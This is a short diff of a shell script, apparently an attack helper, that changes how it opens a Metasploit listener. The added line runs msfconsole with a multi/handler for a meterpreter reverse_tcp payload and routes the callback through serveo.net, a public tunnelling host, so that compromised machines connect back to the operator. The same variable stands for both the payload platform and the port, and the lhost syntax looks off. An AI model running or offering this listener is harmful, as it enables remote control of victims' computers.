@@ -24,5 +24,5 @@ echo "Wanna Start Listening(y/n)"
 read a
 if [ $a=='y' ] 
 then
-gnome-terminal -x msfconsole
+ msfconsole -x "use multi/handler;set payload $p/meterpreter/reverse_tcp;set lhost=serveo.net;set lport=$p;exploit"
 fi
